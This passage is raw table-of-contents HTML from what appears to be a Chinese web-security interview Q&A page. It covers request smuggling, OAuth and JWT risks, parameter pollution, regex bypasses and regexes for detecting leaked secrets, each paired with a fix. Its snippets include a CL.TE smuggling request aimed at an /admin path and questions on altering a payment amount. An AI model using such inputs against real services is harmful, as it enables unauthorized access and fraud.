href="#%E6%9F%90%E4%B8%AAAPP%E7%9A%84%E6%9F%90%E4%B8%AA%E5%8A%9F%E8%83%BD%E6%8C%89%E9%92%AE%E6%98%AF%E7%81%B0%E8%89%B2%E4%B8%8D%E5%8F%AF%E7%94%A8%E7%8A%B6%E6%80%81%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E5%85%B6%E9%99%90%E5%88%B6%EF%BC%9F"><span class="toc-number">11.1.</span> <span class="toc-text">某个APP的某个功能按钮是灰色不可用状态，如何绕过其限制？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E6%8A%BD%E8%B1%A1%E7%90%86%E8%A7%A3%E5%BD%92%E7%B1%BB%EF%BC%9F"><span class="toc-number">11.2.</span> <span class="toc-text">流程绕过漏洞如何抽象理解归类？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS-1-2-%E5%8D%8F%E8%AE%AE%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">11.3.</span> <span class="toc-text">TLS 1.2 协议交互过程以及攻击方法？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8-TLS-1-2-%EF%BC%8C%E7%A6%81%E7%94%A8%E4%BD%8E%E7%89%88%E6%9C%AC%E3%80%82-%E5%90%AF%E7%94%A8-HSTS%EF%BC%8C%E9%98%B2%E6%AD%A2%E9%99%8D%E7%BA%A7%E6%94%BB%E5%87%BB%E3%80%82-%E4%BD%BF%E7%94%A8-PFS%EF%BC%88Perfect-Forward-Secrecy%EF%BC%89%EF%BC%8C%E9%98%B2%E6%AD%A2%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2%E5%BD%B1%E5%93%8D%E5%8E%86%E5%8F%B2%E6%95%B0%E6%8D%AE%E3%80%82"><span class="toc-number">12.</span> <span class="toc-text">修复方案：- 强制使用 TLS 1.2+，禁用低版本。- 启用 HSTS，防止降级攻击。- 使用 PFS（Perfect Forward Secrecy），防止密钥泄露影响历史数据。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%88HTTP-Request-Smuggling%EF%BC%89%E5%8E%9F%E7%90%86"><span class="toc-number">12.1.</span> <span class="toc-text">HTTP 请求走私（HTTP Request Smuggling）原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-CL-TE-%E6%94%BB%E5%87%BB%EF%BC%9A-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%BB%9F%E4%B8%80-Content-Length-%E5%92%8C-Transfer-Encoding-%E7%9A%84%E8%A7%A3%E6%9E%90%E9%80%BB%E8%BE%91%E3%80%82-%E5%9C%A8-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%A6%81%E7%94%A8-Transfer-Encoding-chunked%E3%80%82-%E4%BD%BF%E7%94%A8%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%A6%82-Nginx%E3%80%81Apache%EF%BC%8C%E4%BF%AE%E5%A4%8D%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E3%80%82"><span class="toc-number">13.</span> <span class="toc-text">利用方式：- CL.TE 攻击：  1234567POST &#x2F; HTTP&#x2F;1.1Host: target.comContent-Length: 15Transfer-Encoding: chunked0GET &#x2F;admin HTTP&#x2F;1.1修复方案：- 统一 Content-Length 和 Transfer-Encoding 的解析逻辑。- 在 Web 服务器和代理服务器中禁用 Transfer-Encoding: chunked。- 使用最新版本的 Web 服务器，如 Nginx、Apache，修复已知漏洞。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSSEC-%E8%83%BD%E8%A7%A3%E5%86%B3%E4%BB%80%E4%B9%88%E5%9C%BA%E6%99%AF%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-number">13.1.</span> <span class="toc-text">DNSSEC 能解决什么场景问题？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6%EF%BC%9A-DNSSEC-%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86-DNS-%E6%9F%A5%E8%AF%A2%E5%86%85%E5%AE%B9%EF%BC%8C%E4%BB%8D%E7%84%B6%E5%AE%B9%E6%98%93%E8%A2%AB%E7%9B%91%E6%8E%A7%E3%80%82-%E9%83%A8%E7%BD%B2%E5%A4%8D%E6%9D%82%EF%BC%8C%E4%B8%94%E9%9C%80%E8%A6%81%E4%B8%8A%E7%BA%A7-DNS-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%AF%E6%8C%81%E3%80%82"><span class="toc-number">14.</span> <span class="toc-text">限制：- DNSSEC 不能加密 DNS 查询内容，仍然容易被监控。- 部署复杂，且需要上级 DNS 服务器支持。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-%E8%AE%B0%E5%BD%95%EF%BC%88DS%E3%80%81PTR%E3%80%81TXT%EF%BC%89%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%B8%B8%E8%A7%81%E4%BD%9C%E7%94%A8%EF%BC%9F"><span class="toc-number">14.1.</span> <span class="toc-text">DNS 记录（DS、PTR、TXT）类型的常见作用？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A-SPF-%E8%AE%B0%E5%BD%95%EF%BC%88TXT%EF%BC%89%EF%BC%9A-%E4%BD%9C%E7%94%A8%EF%BC%9A%E6%8C%87%E5%AE%9A%E5%85%81%E8%AE%B8%E7%9A%84%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E9%98%B2%E6%AD%A2%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6%E3%80%82"><span class="toc-number">15.</span> <span class="toc-text">示例：- SPF 记录（TXT）：  1example.com TXT &quot;v&#x3D;spf1 ip4:192.168.1.1 -all&quot;  作用：指定允许的邮件发送服务器，防止伪造邮件。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E6%9A%82%E6%97%B6%E4%B8%8D%E7%94%A8%E7%9A%84%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E5%88%B0-1-1-1-1-%E6%9C%89%E4%BB%80%E4%B9%88%E5%A5%BD%E5%A4%84%E5%92%8C%E5%9D%8F%E5%A4%84%EF%BC%9F"><span class="toc-number">15.1.</span> <span class="toc-text">将暂时不用的域名解析到 1.1.1.1 有什么好处和坏处？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E5%AE%89%E5%85%A8%E7%9A%84%E5%81%9A%E6%B3%95%EF%BC%9A-%E7%9B%B4%E6%8E%A5%E5%88%A0%E9%99%A4%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95%EF%BC%8C%E6%88%96%E8%AE%BE%E7%BD%AE-NXDOMAIN-%E5%93%8D%E5%BA%94%E3%80%82"><span class="toc-number">16.</span> <span class="toc-text">更安全的做法：- 直接删除域名解析记录，或设置 NXDOMAIN 响应。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OAuth-%E9%99%A4%E4%BA%86-redirect-uri-%E7%BB%95%E8%BF%87%E9%97%AE%E9%A2%98%E5%A4%96%EF%BC%8C%E8%BF%98%E6%9C%89%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D%EF%BC%9F"><span class="toc-number">16.1.</span> <span class="toc-text">OAuth 除了 redirect_uri 绕过问题外，还有哪些风险以及如何修复？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%BC%BA%E5%88%B6%E6%A0%A1%E9%AA%8C-state-%E5%8F%82%E6%95%B0%EF%BC%8C%E9%98%B2%E6%AD%A2-CSRF%EF%BC%9A-%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81-redirect-uri-%EF%BC%8C%E9%81%BF%E5%85%8D%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E6%94%BB%E5%87%BB%E8%80%85%E7%AB%99%E7%82%B9%EF%BC%9A-%E4%BD%BF%E7%94%A8%E7%9F%AD%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F-Token%EF%BC%8C%E9%81%BF%E5%85%8D%E9%95%BF%E6%9C%9F%E6%9A%B4%E9%9C%B2%EF%BC%9A-Access-Token-%E4%BB%85%E5%8F%AF%E4%BD%BF%E7%94%A8%E4%B8%80%E6%AC%A1-%E4%BD%BF%E7%94%A8-Refresh-Token-%E8%BF%9B%E8%A1%8C%E9%95%BF%E6%97%B6%E9%97%B4%E4%BC%9A%E8%AF%9D%E7%BB%B4%E6%8A%A4-%E5%85%A8%E7%A8%8B%E4%BD%BF%E7%94%A8-HTTPS%EF%BC%8C%E9%98%B2%E6%AD%A2-Token-%E8%A2%AB%E7%AA%83%E5%90%AC"><span class="toc-number">17.</span> <span class="toc-text">修复方案：- 强制校验 state 参数，防止 CSRF：  123state &#x3D; generate_secure_token()session[&quot;oauth_state&quot;] &#x3D; stateredirect_uri &#x3D; f&quot;https:&#x2F;&#x2F;auth.com&#x2F;oauth?state&#x3D;{state}&quot;- **严格验证 redirect_uri**，避免重定向到攻击者站点：  12if not redirect_uri.startswith(&quot;https:&#x2F;&#x2F;trusted-site.com&quot;):    abort(403)- 使用短生命周期 Token，避免长期暴露：  - Access Token 仅可使用一次  - 使用 Refresh Token 进行长时间会话维护  - 全程使用 HTTPS，防止 Token 被窃听</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT-%E7%9B%B8%E8%BE%83%E4%BA%8E-SESSION-%E7%9A%84%E4%BC%98%E5%8A%BF%EF%BC%9F"><span class="toc-number">17.1.</span> <span class="toc-text">JWT 相较于 SESSION 的优势？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A-JWT-%E4%B8%80%E6%97%A6%E6%B3%84%E9%9C%B2%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%95%BF%E6%9C%9F%E4%BD%BF%E7%94%A8%EF%BC%8C%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%E7%9F%AD%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F-Token%E3%80%82-%E9%9C%80%E4%BD%BF%E7%94%A8-RS256%EF%BC%88%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%89-%E6%88%96-HS256%EF%BC%88%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%89%EF%BC%8C%E9%81%BF%E5%85%8D-none-%E7%AE%97%E6%B3%95%E6%BC%8F%E6%B4%9E%E3%80%82"><span class="toc-number">18.</span> <span class="toc-text">安全注意点：- JWT 一旦泄露，攻击者可以长期使用，建议使用短生命周期 Token。- 需使用 RS256（非对称加密） 或 HS256（对称加密），避免 none 算法漏洞。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87-HTTP-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%B0%86-uid-9527-amount-100-%E4%B8%AD%E7%9A%84-uid-%E6%94%B9%E4%B8%BA-10086%EF%BC%9F"><span class="toc-number">18.1.</span> <span class="toc-text">如何通过 HTTP 参数污染将 uid&#x3D;9527&amp;amount&#x3D;100 中的 uid 改为 10086？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%B8%A5%E6%A0%BC%E9%99%90%E5%88%B6%E5%8F%82%E6%95%B0%E6%A0%BC%E5%BC%8F%EF%BC%8C%E6%8B%92%E7%BB%9D%E9%87%8D%E5%A4%8D%E5%8F%82%E6%95%B0%E3%80%82-%E7%BB%9F%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90%E6%96%B9%E5%BC%8F%EF%BC%8C%E7%A1%AE%E4%BF%9D%E5%8F%82%E6%95%B0%E5%94%AF%E4%B8%80%E6%80%A7%E3%80%82"><span class="toc-number">19.</span> <span class="toc-text">修复方案：- 严格限制参数格式，拒绝重复参数。- 统一服务器端参数解析方式，确保参数唯一性。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E7%BD%91%E5%85%B3%E5%AF%B9%E6%89%80%E6%9C%89%E8%AF%B7%E6%B1%82%E4%BC%9A%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E5%BC%BA%E5%88%B6-urldecode%EF%BC%8C%E5%AD%98%E5%9C%A8%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0-uid-9527-remark-%E5%85%85%E8%AF%9D%E8%B4%B9-amount-100-%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%8C%E4%BB%85%E5%A4%87%E6%B3%A8%E5%AD%97%E6%AE%B5%EF%BC%88remark%EF%BC%89%E5%8F%AF%E6%8E%A7%E6%97%B6%EF%BC%8C%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E6%9C%80%E7%BB%88%E7%9A%84%E9%87%91%E9%A2%9D%E5%AD%97%E6%AE%B5%EF%BC%88amount%EF%BC%89%EF%BC%9F"><span class="toc-number">19.1.</span> <span class="toc-text">当网关对所有请求会进行一次强制 urldecode，存在一个参数 uid&#x3D;9527&amp;remark&#x3D;充话费&amp;amount&#x3D;100 的接口，仅备注字段（remark）可控时，如何改变最终的金额字段（amount）？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%AF%B9%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%A3%80%E6%9F%A5%EF%BC%8C%E9%81%BF%E5%85%8D-urldecode-%E8%A7%A3%E6%9E%90%E5%8F%82%E6%95%B0%E3%80%82-%E4%BD%BF%E7%94%A8-JSON-%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE%EF%BC%8C%E9%81%BF%E5%85%8D-query-string-%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98%E3%80%82"><span class="toc-number">20.</span> <span class="toc-text">修复方案：- 对输入数据进行二次编码检查，避免 urldecode 解析参数。- 使用 JSON 传输数据，避免 query string 参数解析问题。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AA%E4%BA%9B%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B5%8B%E8%AF%95%E5%AF%B9%E4%B8%9A%E5%8A%A1%E6%9C%89%E6%8D%9F%EF%BC%9F%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%EF%BC%9F"><span class="toc-number">20.1.</span> <span class="toc-text">哪些漏洞的测试对业务有损？如何避免？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%BF%E5%85%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%9C%A8-%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83-%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81%EF%BC%8C%E9%81%BF%E5%85%8D%E7%9B%B4%E6%8E%A5%E5%9C%A8%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95%E3%80%82-%E5%AF%B9%E5%85%B3%E9%94%AE-API-%E9%99%90%E5%88%B6%E9%AB%98%E9%A2%91%E8%AF%B7%E6%B1%82%EF%BC%8C%E9%98%B2%E6%AD%A2%E5%BD%B1%E5%93%8D%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C%E3%80%82"><span class="toc-number">21.</span> <span class="toc-text">避免方案：- 在 测试环境 进行验证，避免直接在生产环境测试。- 对关键 API 限制高频请求，防止影响用户体验。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%B8%80%E8%88%AC%E5%88%86%E4%B8%BA%E5%93%AA%E5%87%A0%E4%B8%AA%E6%AD%A5%E9%AA%A4%EF%BC%9F"><span class="toc-number">21.1.</span> <span class="toc-text">漏洞修复一般分为哪几个步骤？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%B6%E5%AE%9A%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%97%B6%E9%97%B4%EF%BC%9F%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E5%93%AA%E4%BA%9B%E5%9B%A0%E7%B4%A0%EF%BC%9F"><span class="toc-number">21.2.</span> <span class="toc-text">如何制定漏洞的修复时间？需要考虑哪些因素？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%EF%BC%9A-P0%EF%BC%88%E9%AB%98%E5%8D%B1%EF%BC%89%EF%BC%9A24-%E5%B0%8F%E6%97%B6%E5%86%85%E4%BF%AE%E5%A4%8D%E3%80%82-P1%EF%BC%88%E4%B8%AD%E5%8D%B1%EF%BC%89%EF%BC%9A1-%E5%91%A8%E5%86%85%E4%BF%AE%E5%A4%8D%E3%80%82-P2%EF%BC%88%E4%BD%8E%E5%8D%B1%EF%BC%89%EF%BC%9A1-%E4%B8%AA%E6%9C%88%E5%86%85%E4%BF%AE%E5%A4%8D%E3%80%82"><span class="toc-number">22.</span> <span class="toc-text">最佳实践：- P0（高危）：24 小时内修复。- P1（中危）：1 周内修复。- P2（低危）：1 个月内修复。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9C%89%E6%95%88%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%95%88%E7%8E%87%EF%BC%9F"><span class="toc-number">22.1.</span> <span class="toc-text">如何有效提升漏洞修复效率？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%8C%96%E6%96%B9%E6%B3%95%EF%BC%9A-%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%EF%BC%8C%E5%88%B6%E5%AE%9A%E6%A0%87%E5%87%86%E5%8C%96%E4%BF%AE%E5%A4%8D%E6%B5%81%E7%A8%8B%E3%80%82-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%EF%BC%8C%E5%87%8F%E5%B0%91%E5%9B%9E%E5%BD%92%E6%B5%8B%E8%AF%95%E6%88%90%E6%9C%AC%E3%80%82-%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD%EF%BC%8C%E6%8F%90%E9%AB%98%E4%BF%AE%E5%A4%8D%E8%83%BD%E5%8A%9B%E3%80%82"><span class="toc-number">23.</span> <span class="toc-text">优化方法：- 漏洞分类，制定标准化修复流程。- 自动化测试，减少回归测试成本。- 开发安全培训，提高修复能力。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%97%A0%E6%B3%95%E5%87%86%E7%A1%AE%E5%88%A4%E6%96%AD%E5%AD%98%E5%9C%A8%E4%B8%8E%E5%90%A6%E7%9A%84%EF%BC%9F"><span class="toc-number">23.1.</span> <span class="toc-text">什么类型漏洞是代码审计无法准确判断存在与否的？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%BB%93%E5%90%88%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%EF%BC%88DAST%EF%BC%89-%E4%BA%BA%E5%B7%A5%E6%B5%8B%E8%AF%95%EF%BC%8C%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%90%A6%E5%8F%AF%E8%A2%AB%E5%88%A9%E7%94%A8%E3%80%82"><span class="toc-number">24.</span> <span class="toc-text">解决方案：- 结合动态分析（DAST）+人工测试，验证漏洞是否可被利用。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E7%9A%84%E8%AF%86%E5%88%AB%E7%9A%84%E6%AD%A3%E5%88%99%E5%A6%82%E4%BD%95%E5%86%99%EF%BC%9F"><span class="toc-number">24.1.</span> <span class="toc-text">密钥的识别的正则如何写？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%B9%E9%85%8D-API-Key%E3%80%81JWT%E3%80%81OAuth-Token%EF%BC%9A-i-apikey-token-secret-password-bearer-s-s-A-Za-z0-9-20-60-%E5%8C%B9%E9%85%8D-AWS-%E8%AE%BF%E9%97%AE%E5%AF%86%E9%92%A5%EF%BC%9AAKIA-0-9A-Z-16-%E5%8C%B9%E9%85%8D%E7%A7%81%E9%92%A5%EF%BC%9A-BEGIN-RSA-DSA-EC-PRIVATE-KEY-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%A6%81%E6%AD%A2%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%88%96%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%AD%98%E5%82%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E3%80%82"><span class="toc-number">25.</span> <span class="toc-text">匹配 API Key、JWT、OAuth Token：(?i)(apikey|token|secret|password|bearer)\s*[:&#x3D;]\s*[&quot;&#39;]?([A-Za-z0-9\-_]{20,60})[&quot;&#39;]?匹配 AWS 访问密钥：AKIA[0-9A-Z]{16}匹配私钥：-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----修复方案：- 禁止密钥硬编码，使用环境变量或配置管理工具存储敏感信息。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99-a-%E4%BC%9A%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">25.1.</span> <span class="toc-text">正则 (a+)+ 会存在哪些风险？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8%E5%B5%8C%E5%A5%97%E9%87%8D%E5%A4%8D%E5%8C%B9%E9%85%8D-a-%EF%BC%8C%E6%94%B9%E7%94%A8-a-%E9%99%90%E5%88%B6%E5%8C%B9%E9%85%8D%E8%8C%83%E5%9B%B4%E3%80%82-%E4%BD%BF%E7%94%A8%E9%9D%9E%E5%9B%9E%E6%BA%AF%E6%AD%A3%E5%88%99%EF%BC%88%E5%A6%82-RE2-%E5%BC%95%E6%93%8E%EF%BC%89%E3%80%82"><span class="toc-number">26.</span> <span class="toc-text">修复方案：- 避免使用嵌套重复匹配 (a+)+，改用 ^a+$ 限制匹配范围。- 使用非回溯正则（如 RE2 引擎）。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%AF%B9%E8%AF%BB%E5%8F%96%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E6%AD%A3%E5%88%99%E4%B8%BA-markdown-%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="toc-number">26.1.</span> <span class="toc-text">程序对读取的文件名的正则为 &#x2F;\.markdown&#x2F;，如何绕过？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%B8%A5%E6%A0%BC%E4%BD%BF%E7%94%A8-basename-%E8%A7%A3%E6%9E%90%E8%B7%AF%E5%BE%84%EF%BC%9A"><span class="toc-number">27.</span> <span class="toc-text">修复方案：- 严格使用 basename 解析路径：  1234import osfilename &#x3D; os.path.basename(user_input)if not filename.endswith(&quot;.markdown&quot;):    raise Exception(&quot;Invalid file type&quot;)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%AF%B9%E8%AF%B7%E6%B1%82%E7%9A%84-URL-%E7%9A%84%E6%AD%A3%E5%88%99%E4%B8%BA-http-feei-cn-%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="toc-number">27.1.</span> <span class="toc-text">程序对请求的 URL 的正则为 &#x2F;^http\:\&#x2F;\&#x2F;.*\.feei.cn($|\(\&#x2F;[^&lt;&gt;\&quot;&quot;]*\))&#x2F;，如何绕过？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%B8%A5%E6%A0%BC%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%EF%BC%8C%E4%B8%8D%E4%BE%9D%E8%B5%96%E6%AD%A3%E5%88%99%EF%BC%9A"><span class="toc-number">28.</span> <span class="toc-text">修复方案：- 严格解析域名，不依赖正则：  12345from urllib.parse import urlparsedef validate_url(url):    parsed &#x3D; urlparse(url)    if not parsed.netloc.endswith(&quot;.feei.cn&quot;):        raise ValueError(&quot;Invalid domain&quot;)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%9C%A8%E8%AF%AD%E6%B3%95%E6%A0%91%E5%88%86%E6%9E%90%E4%B8%8A%E6%9C%89%E4%BB%80%E4%B9%88%E5%B7%AE%E5%BC%82%EF%BC%9F"><span class="toc-number">28.1.</span> <span class="toc-text">解释型语言和编译型语言在语法树分析上有什么差异？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%EF%BC%88%E5%A6%82-C%E3%80%81Java%EF%BC%89%EF%BC%9A-%E7%B1%BB%E5%9E%8B%E7%A1%AE%E5%AE%9A%EF%BC%9A%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E5%9C%A8%E7%BC%96%E8%AF%91%E6%9C%9F%E5%B7%B2%E7%A1%AE%E5%AE%9A%EF%BC%8C%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%9B%B4%E7%A8%B3%E5%AE%9A%E3%80%82-%E4%BC%98%E5%8C%96%E5%8F%AF%E8%83%BD%E5%BD%B1%E5%93%8D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E7%BC%96%E8%AF%91%E5%99%A8%E4%BC%98%E5%8C%96%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E6%9F%90%E4%BA%9B%E6%BC%8F%E6%B4%9E%E9%9A%BE%E4%BB%A5%E8%A2%AB%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%8F%91%E7%8E%B0%E3%80%82"><span class="toc-number">29.</span> <span class="toc-text">编译型语言（如 C、Java）：- 类型确定：变量类型在编译期已确定，静态分析更稳定。- 优化可能影响漏洞分析：编译器优化可能导致某些漏洞难以被静态分析发现。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Web-%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84-Source-%E5%92%8C-Sink-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span 